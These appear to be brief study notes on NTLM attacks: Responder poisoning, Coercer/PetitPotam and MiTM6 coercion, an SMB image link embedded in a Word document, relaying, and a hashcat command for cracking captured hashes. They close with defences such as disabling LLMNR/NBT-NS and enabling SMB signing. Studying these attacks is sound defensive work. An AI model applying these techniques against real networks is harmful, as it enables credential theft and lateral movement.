NTLM authentication
  Responder uses thre main protocols to connect/authenticate: NetBIOS Name Server (NBT-NS), Link-Local Multicast Name Resolution (LLMNR), Multicast DNS (mDNS)
  Responder used inside network lateral movement
  Responder captures challenge/response 
RPC methods to execute API calls on remote machine (ex. \\<ip>\share\file.txt)  #no special permissions needed
  Coercer and PetitPotam for RPC
Can coerce witih IPv6
  Assign target system IPv6 addr in link-local range
  MiTM6, will listen and reply to DHCPv6 messages 
  W/O PARAMETERS, MiTM6 WILL TARGET EVERY SYSTEM AND DOMAIN ON NETWORK
SMB Coerce
  Embed hosted SMB share picture in word documet (ex. ctrl f9, {IMPORT\\\\<ip>\\image.jpeg})
  responder listens on target IP
  DISABLE OUBOUND SMB
NTLM relays
  Can sit in between and relay requests, challenge, and authentication
Crack NTLM challenge/response
  hashcat -m 5600 hash.txt password_list.txt -o cracked.txt
  hash.txt is the hash to crack, the password list can be changed, possibly develop your own.
  LONG COMPLEX PASSWORDS
Defending against these attacks
  NBT-NS, LLMNR, and mDNS be DISABLED
  SMB signing prevents relay attacks, use group policy (may result in reduced performance of 15%
  Use private VLANS (communication to router, no lateral communication)
